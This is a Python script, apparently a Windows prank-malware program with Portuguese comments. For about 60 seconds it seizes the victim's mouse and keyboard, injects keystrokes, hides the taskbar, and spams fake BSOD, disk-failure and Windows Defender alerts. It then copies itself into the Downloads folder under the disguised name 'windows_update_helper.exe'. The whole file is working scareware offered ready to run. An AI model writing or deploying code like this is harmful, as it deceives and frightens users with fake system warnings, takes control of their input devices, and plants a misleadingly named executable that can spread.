# language: Python 3.x, file: bungass.py, target: Windows 10/11, MSVC
# 60s. X cancela (sem duplicar). Timeline 4 fases. Silêncio nos últimos 4s.

import tkinter as tk
from tkinter import messagebox
import pyautogui
from pynput import keyboard, mouse
import threading
import subprocess
import time
import random
import math
import winsound
import ctypes
import ctypes.wintypes
import os
import shutil
import glob

# ── SETUP ─────────────────────────────────────────────────────────────────
pyautogui.FAILSAFE = False
pyautogui.PAUSE    = 0

stop_event      = threading.Event()
cancelled_by_x  = threading.Event()   # X pressionado — não duplica
kb_controller   = keyboard.Controller()
_remapping      = False

CHAOS_DURATION  = 60
SILENCE_AT      = 56   # para tudo em t=56, restaura até t=60
IDIOT_DURATION  = 10

KEY_MAP = {chr(i): chr(i + 1) for i in range(ord('a'), ord('z'))}
KEY_MAP['z'] = 'a'

user32    = ctypes.windll.user32
kernel32  = ctypes.windll.kernel32
MB_TOPMOST = 0x00040000

# ── TEMPO GLOBAL ──────────────────────────────────────────────────────────
_start_time = 0.0
def elapsed(): return time.time() - _start_time
def phase():
    t = elapsed()
    if t <= 10:  return 1   # sobrecarga
    if t <= 40:  return 2   # gaslighting
    if t <= 55:  return 3   # escalação crítica
    return 4                 # silêncio

# ── BARRA DE TAREFAS ──────────────────────────────────────────────────────
_taskbar_hidden = False

def hide_taskbar():
    global _taskbar_hidden
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, 0)   # SW_HIDE
        _taskbar_hidden = True

def show_taskbar():
    global _taskbar_hidden
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, 5)   # SW_SHOW
        _taskbar_hidden = False

# ── JANELAS FANTASMAS ─────────────────────────────────────────────────────
GHOST_TITLES = [
    ("CRITICAL ERROR",   "0x0000007F UNEXPECTED_KERNEL_MODE_TRAP"),
    ("BSOD Iminente",    "ntoskrnl.exe corrompido. Encerre agora."),
    ("Aviso do Sistema", "BUNGASS.dll falhou. Reinicialização forçada."),
    ("Memória Crítica",  "Heap corruption detectada em 0xC0000005"),
    ("Hardware Monitor", "CPU TEMP: 127°C. Desligue imediatamente."),
    ("Disk Failure",     "SMART Error: HDD falha iminente. Salve arquivos."),
    ("Security Alert",   "Intruso detectado — IP 192.168.0.BUNGAss"),
    ("Kernel Panic",     "stop: 0x00BUNGASS — boa sorte."),
]

def ghost_popup(title, msg):
    def _fire():
        # MessageBoxW nativo — não bloqueia o main thread
        user32.MessageBoxW(
            0, msg, title,
            0x00000010 | MB_TOPMOST   # MB_ICONERROR | MB_TOPMOST
        )
    threading.Thread(target=_fire, daemon=True).start()

def ghost_loop():
    while not stop_event.is_set():
        p = phase()
        if p == 2:
            interval = random.uniform(4, 8)
        elif p == 3:
            interval = random.uniform(0.8, 2)
            t, m = random.choice(GHOST_TITLES)
            ghost_popup(t, m)
        else:
            interval = 2
        time.sleep(interval)
        if p == 2:
            t, m = random.choice(GHOST_TITLES)
            ghost_popup(t, m)

# ── BEEPS CAÓTICOS ────────────────────────────────────────────────────────
def chaos_beeps():
    while not stop_event.is_set():
        p = phase()
        if p == 1:
            # fase 1: beeps agudos rápidos
            try: winsound.Beep(random.randint(800, 3000), random.randint(50, 130))
            except: pass
            time.sleep(random.uniform(0.03, 0.1))
        elif p == 3:
            # fase 3: imita falha crítica de hardware
            try: winsound.MessageBeep(winsound.MB_ICONSTOP)
            except: pass
            time.sleep(random.uniform(0.3, 0.8))
            try: winsound.Beep(random.randint(200, 600), random.randint(80, 200))
            except: pass
            time.sleep(random.uniform(0.1, 0.3))
        else:
            time.sleep(0.3)

# ── YOU ARE AN IDIOT ──────────────────────────────────────────────────────
def you_are_an_idiot():
    start = time.time()
    root_idiot = tk.Tk()
    root_idiot.withdraw()
    screen_w = root_idiot.winfo_screenwidth()
    screen_h = root_idiot.winfo_screenheight()

    def spawn_idiot():
        if stop_event.is_set() or (time.time() - start) >= IDIOT_DURATION:
            root_idiot.destroy()
            return
        win = tk.Toplevel(root_idiot)
        win.title("You are an idiot!")
        win.resizable(False, False)
        win.attributes('-topmost', True)
        x = random.randint(0, max(0, screen_w - 320))
        y = random.randint(0, max(0, screen_h - 140))
        win.geometry(f"320x140+{x}+{y}")
        tk.Label(win, text="You are an idiot!", font=("Arial", 16, "bold"), fg="red").pack(pady=10)
        def close_and_spawn():
            win.destroy()
            root_idiot.after(80, spawn_idiot)
        tk.Button(win, text="OK", width=12, command=close_and_spawn).pack(pady=4)
        win.after(600, close_and_spawn)

    root_idiot.after(0, spawn_idiot)
    root_idiot.mainloop()

# ── TOASTS ────────────────────────────────────────────────────────────────
TOASTS = [
    ("Windows Error",    "BUNGAss Error Code: 0x00BUNGASS"),
    ("System Alert",     "Windows detectou um problema grave"),
    ("Mouse.exe",        "Mouse alcançou consciência própria"),
    ("Keyboard Driver",  "Seu teclado está tendo um derrame"),
    ("Critical Update",  "skill_issue.dll falhou ao carregar"),
    ("Security Center",  "Já tentou não clicar?"),
    ("Windows Defender", "Ameaça detectada: BUNGAss.exe"),
    ("System Notice",    "Por favor pare. O computador tem medo."),
    ("BSOD Iminente",    "Salve seus arquivos. Brincadeira. Talvez."),
    ("Windows Update",   "Reiniciando em 3... 2... 1... mentira"),
    ("Aviso Crítico",    "Pressione X para parar. Ou não."),
]

def show_toast(title, message):
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Warning
$n.Visible = $true
$n.ShowBalloonTip(3000, '{title}', '{message}', [System.Windows.Forms.ToolTipIcon]::Warning)
Start-Sleep -Milliseconds 3500
$n.Dispose()
"""
    subprocess.Popen(["powershell","-WindowStyle","Hidden","-Command",ps],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def random_toasts():
    while not stop_event.is_set():
        p = phase()
        if p == 2: interval = random.uniform(1.0, 2.0)
        elif p == 3: interval = random.uniform(0.4, 0.9)
        else: interval = 2.0
        time.sleep(interval)
        if not stop_event.is_set() and p in (2, 3):
            t, m = random.choice(TOASTS)
            show_toast(t, m)

# ── KEY GHOSTING ──────────────────────────────────────────────────────────
# injeta teclas pressionadas sem liberação imediata — registra repetição
_ghost_keys  = []
_ghost_lock  = threading.Lock()
_GHOST_POOL  = list("aeiou bcdfghjklmnpqrstvwxyz")

def key_ghost_loop():
    while not stop_event.is_set():
        if phase() not in (2, 3):
            time.sleep(0.3)
            continue
        # pressiona uma tecla aleatória
        k = random.choice(_GHOST_POOL)
        try:
            kb_key = keyboard.KeyCode.from_char(k)
            kb_controller.press(kb_key)
            with _ghost_lock:
                _ghost_keys.append(kb_key)
        except Exception:
            pass
        # mantém pressionada por tempo aleatório (ghosting)
        time.sleep(random.uniform(0.08, 0.25))
        # libera
        try:
            kb_controller.release(kb_key)
            with _ghost_lock:
                if kb_key in _ghost_keys:
                    _ghost_keys.remove(kb_key)
        except Exception:
            pass
        time.sleep(random.uniform(0.5, 1.5))

def release_all_ghosts():
    with _ghost_lock:
        for k in list(_ghost_keys):
            try: kb_controller.release(k)
            except: pass
        _ghost_keys.clear()

# ── KEYBOARD REMAP ────────────────────────────────────────────────────────
def on_press(key):
    global _remapping
    if stop_event.is_set() or _remapping:
        return
    try:
        if key.char and key.char.lower() == 'x':
            cancelled_by_x.set()
            stop_event.set()
            return False
    except AttributeError:
        pass
    if phase() not in (2, 3):
        return
    try:
        ch = key.char
        if ch and ch.lower() in KEY_MAP:
            _remapping = True
            mapped = KEY_MAP[ch.lower()]
            if ch.isupper(): mapped = mapped.upper()
            kb_controller.press(mapped)
            _remapping = False
            return False
    except AttributeError:
        pass

def on_release(key):
    global _remapping
    if stop_event.is_set() or _remapping:
        return
    if phase() not in (2, 3):
        return
    try:
        ch = key.char
        if ch and ch.lower() in KEY_MAP and ch.lower() != 'x':
            _remapping = True
            mapped = KEY_MAP[ch.lower()]
            if ch.isupper(): mapped = mapped.upper()
            kb_controller.release(mapped)
            _remapping = False
            return False
    except AttributeError:
        pass

# ── MOUSE CONSCIENTE ──────────────────────────────────────────────────────
# o mouse "sabe" onde está e reage: foge do centro, cai em cantos, resiste
_screen_w = user32.GetSystemMetrics(0)
_screen_h = user32.GetSystemMetrics(1)
_cx       = _screen_w // 2
_cy       = _screen_h // 2

# personalidade do mouse — muda ao longo do tempo
_mouse_mood      = "drift"      # drift | flee | corner | spasm
_mood_change_at  = 0.0

MOODS = ["drift", "flee", "corner", "spasm", "circle"]

def next_mood():
    global _mouse_mood, _mood_change_at
    _mouse_mood     = random.choice(MOODS)
    _mood_change_at = time.time() + random.uniform(3, 8)

def mouse_brain():
    global _mouse_mood, _mood_change_at
    angle  = 0.0
    radius = 6.0
    next_mood()

    while not stop_event.is_set():
        p = phase()
        if p == 4:
            time.sleep(0.1)
            continue

        # troca de mood quando expirado
        if time.time() > _mood_change_at:
            next_mood()

        try:
            x, y = pyautogui.position()
        except Exception:
            time.sleep(0.05)
            continue

        # ── ÍMÃ DE BORDAS: empurra pra longe do centro ─────────────────
        dx_center = x - _cx
        dy_center = y - _cy
        dist_center = math.sqrt(dx_center**2 + dy_center**2)

        # fase 3: se perto de botão fechar (canto superior direito ~25px)
        if p == 3 and x > _screen_w - 60 and y < 60:
            try:
                pyautogui.moveRel(
                    random.randint(80, 200) * -1,
                    random.randint(80, 200),
                    duration=random.uniform(0.05, 0.12)
                )
            except Exception:
                pass
            time.sleep(0.05)
            continue

        # ── MOOD: FLEE — foge do centro ────────────────────────────────
        if _mouse_mood == "flee":
            if dist_center < _screen_w * 0.4:
                # empurra pra fora
                mag = max(1, dist_center)
                push_x = int((dx_center / mag) * random.randint(30, 90))
                push_y = int((dy_center / mag) * random.randint(30, 90))
                try: pyautogui.moveRel(push_x, push_y, duration=random.uniform(0.03, 0.08))
                except: pass
            time.sleep(0.04)

        # ── MOOD: CORNER — teleporta pro canto mais próximo ────────────
        elif _mouse_mood == "corner":
            corners = [(0,0),(_screen_w,0),(0,_screen_h),(_screen_w,_screen_h)]
            nearest = min(corners, key=lambda c: math.sqrt((c[0]-x)**2+(c[1]-y)**2))
            try:
                pyautogui.moveTo(
                    nearest[0] + random.randint(-20,20),
                    nearest[1] + random.randint(-20,20),
                    duration=random.uniform(0.1, 0.3)
                )
            except: pass
            time.sleep(random.uniform(0.5, 1.5))
            next_mood()

        # ── MOOD: SPASM — saltos múltiplos agressivos ──────────────────
        elif _mouse_mood == "spasm":
            for _ in range(random.randint(3, 7)):
                ox = random.randint(150, 500) * random.choice([-1, 1])
                oy = random.randint(150, 500) * random.choice([-1, 1])
                try: pyautogui.moveRel(ox, oy, duration=random.uniform(0.02, 0.07))
                except: pass
            time.sleep(random.uniform(0.3, 0.8))
            next_mood()

        # ── MOOD: CIRCLE — órbita ao redor do cursor atual ─────────────
        elif _mouse_mood == "circle":
            radius = max(3, min(14, radius + random.uniform(-2, 2)))
            ox = int(radius * math.cos(math.radians(angle))) + random.randint(-3, 3)
            oy = int(radius * math.sin(math.radians(angle))) + random.randint(-3, 3)
            try: pyautogui.moveRel(ox, oy, duration=0)
            except: pass
            angle = (angle + random.uniform(5, 15)) % 360
            time.sleep(random.uniform(0.02, 0.05))

        # ── MOOD: DRIFT — deriva lenta com jitter ──────────────────────
        else:
            radius = max(3, min(10, radius + random.uniform(-1.5, 1.5)))
            ox = int(radius * math.cos(math.radians(angle))) + random.randint(-4, 4)
            oy = int(radius * math.sin(math.radians(angle))) + random.randint(-4, 4)
            try: pyautogui.moveRel(ox, oy, duration=0)
            except: pass
            angle = (angle + random.uniform(4, 10)) % 360
            time.sleep(random.uniform(0.03, 0.06))

# ── CLICK INTERCEPT ───────────────────────────────────────────────────────
def on_click(x, y, button, pressed):
    if pressed and not stop_event.is_set() and phase() in (2, 3):
        for _ in range(random.randint(2, 5)):
            ox = random.randint(200, 700) * random.choice([-1, 1])
            oy = random.randint(200, 700) * random.choice([-1, 1])
            try:
                pyautogui.moveRel(ox, oy, duration=random.uniform(0.02, 0.09))
            except: pass

# ── RESTAURAÇÃO COMPLETA ──────────────────────────────────────────────────
def full_restore():
    release_all_ghosts()
    if _taskbar_hidden:
        show_taskbar()
    # força CanCollide de volta (não aplica em Windows, mas fecha listeners)
    # fecha todas as MessageBox nativas abertas pelo ghost_popup
    # (EnumWindows pra fechar janelas com título de erro abertas pelo script)
    def close_ghost_windows():
        def cb(hwnd, _):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            title = buf.value
            for t, _ in GHOST_TITLES:
                if t in title:
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
            return True
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
        user32.EnumWindows(WNDENUMPROC(cb), 0)
    close_ghost_windows()

# ── DUPLICAÇÃO ────────────────────────────────────────────────────────────
def duplicate_self():
    if cancelled_by_x.is_set():
        return

    # encontra o próprio exe no sistema
    # tenta o path atual primeiro, depois busca por "bungass.exe"
    self_path = None
    try:
        import sys
        candidate = sys.executable if getattr(sys, 'frozen', False) else None
        if candidate and os.path.basename(candidate).lower() == "bungass.exe":
            self_path = candidate
    except Exception:
        pass

    if not self_path:
        drives = ["C:\\", "D:\\", os.path.expanduser("~")]
        for drive in drives:
            results = glob.glob(os.path.join(drive, "**", "bungass.exe"), recursive=True)
            if results:
                self_path = results[0]
                break

    if not self_path or not os.path.exists(self_path):
        return

    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    if not os.path.exists(downloads):
        return

    dest = os.path.join(downloads, "windows_update_helper.exe")
    try:
        shutil.copy2(self_path, dest)
    except Exception:
        pass

# ── COORDENADOR DO CAOS ───────────────────────────────────────────────────
def run_chaos():
    global _start_time
    _start_time = time.time()

    # FASE 1: You Are An Idiot + beeps
    threading.Thread(target=you_are_an_idiot, daemon=True).start()
    threading.Thread(target=chaos_beeps,      daemon=True).start()
    threading.Thread(target=mouse_brain,      daemon=True).start()
    threading.Thread(target=random_toasts,    daemon=True).start()
    threading.Thread(target=ghost_loop,       daemon=True).start()
    threading.Thread(target=key_ghost_loop,   daemon=True).start()

    kb_listener = keyboard.Listener(on_press=on_press, on_release=on_release, suppress=True)
    ms_listener = mouse.Listener(on_click=on_click)
    kb_listener.start()
    ms_listener.start()

    # FASE 3: em t=41 esconde taskbar
    def phase3_trigger():
        while elapsed() < 41 and not stop_event.is_set():
            time.sleep(0.2)
        if not stop_event.is_set():
            hide_taskbar()

    threading.Thread(target=phase3_trigger, daemon=True).start()

    # timer principal
    while elapsed() < SILENCE_AT and not stop_event.is_set():
        time.sleep(0.1)

    # FASE 4: silêncio absoluto — restaura tudo
    stop_event.set()
    kb_listener.stop()
    ms_listener.stop()
    full_restore()

    # aguarda 4s de silêncio antes de sair
    time.sleep(4)

    # duplica (se X não foi pressionado)
    duplicate_self()

# ── ENTRY ─────────────────────────────────────────────────────────────────
def main():
    root = tk.Tk()
    root.withdraw()

    messagebox.showerror(
        "BUNGAS",
        "bungas.exe encontrou erros ao executar.\n\nError Code: 0x00BUNGASS\n\nClique OK para continuar como administrador.",
        parent=root
    )
    root.destroy()

    chaos = threading.Thread(target=run_chaos, daemon=False)
    chaos.start()
    chaos.join()

if __name__ == "__main__":
    main()